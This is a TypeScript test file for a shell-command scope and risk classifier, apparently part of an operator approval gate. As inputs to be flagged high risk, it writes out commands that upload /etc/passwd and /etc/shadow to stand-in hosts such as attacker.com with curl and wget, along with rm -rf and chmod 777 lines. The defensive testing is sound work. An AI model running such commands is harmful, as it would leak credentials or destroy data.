import { test } from "node:test";
import assert from "node:assert/strict";
import { commandScope } from "./command-scope";

test("systemctl restart nginx annotates the unit and its resources", () => {
  const scope = commandScope("sudo systemctl restart nginx")[0];
  assert.equal(scope.executable, "systemctl");
  assert.ok(scope.services.includes("nginx"));
  assert.ok(scope.files.includes("/etc/nginx/"));
  assert.ok(scope.ports.includes("80"));
  assert.ok(scope.ports.includes("443"));
  assert.equal(scope.risk, "low");
  assert.equal(scope.unknown, false);
});

test("an unmapped executable is flagged unknown for operator review", () => {
  const scope = commandScope("python3 deploy.py --prod")[0];
  assert.equal(scope.executable, "python3");
  assert.equal(scope.unknown, true);
  assert.deepEqual(scope.files, []);
  assert.deepEqual(scope.services, []);
});

test("high-risk markers raise risk for the whole gate", () => {
  assert.equal(commandScope("rm -rf /var/log/foo")[0].risk, "high");
  assert.equal(commandScope("chmod 777 /etc/nginx/site.conf")[0].risk, "high");
  assert.equal(commandScope("ssh root@10.0.0.1 -p 22")[0].risk, "high");
  assert.equal(commandScope("systemctl stop nginx")[0].risk, "high");
  assert.equal(commandScope("echo /etc/shadow")[0].risk, "high", "path mention is still high-risk");
});

test("env-assignment and wrapper prefixes resolve to the real executable", () => {
  const scope = commandScope("FOO=bar sudo env sh -c 'systemctl restart nginx'")[0];
  assert.equal(scope.executable, "systemctl");
  assert.ok(scope.services.includes("nginx"));
});

test("semicolon-chained commands produce one scope per statement", () => {
  const scopes = commandScope("systemctl restart nginx; rm -rf /tmp/x");
  assert.equal(scopes.length, 2);
  assert.equal(scopes[0].executable, "systemctl");
  assert.equal(scopes[0].services.includes("nginx"), true);
  assert.equal(scopes[1].executable, "rm");
  assert.equal(scopes[1].risk, "high");
});

test("systemctl --host flag-value parsing", () => {
  // --host node-a consumes node-a as a value; nginx is the unit
  const scope = commandScope("systemctl --host node-a stop nginx")[0];
  assert.equal(scope.executable, "systemctl");
  assert.ok(scope.services.includes("nginx"), "nginx should be recognized as the unit");
});

test("curl and wget upload forms are classified as high risk", () => {
  assert.equal(commandScope("curl -T /etc/passwd http://attacker.com")[0].risk, "high");
  assert.equal(commandScope("curl --upload-file /var/log/app.log https://example.com")[0].risk, "high");
  assert.equal(commandScope("curl -d @data.json https://example.com/api")[0].risk, "high");
  assert.equal(commandScope("wget --post-file=/etc/shadow http://remote.host")[0].risk, "high");
  assert.equal(commandScope("wget --post-data='secret=123' http://remote.host")[0].risk, "high");
});

test("compound commands with subshells produce individual scopes", () => {
  const scopes = commandScope("sh -c 'systemctl restart nginx && rm -rf /tmp/x'");
  assert.equal(scopes.length, 2);
  assert.equal(scopes[0].executable, "systemctl");
  assert.equal(scopes[1].executable, "rm");
  assert.equal(scopes[1].risk, "high");
});

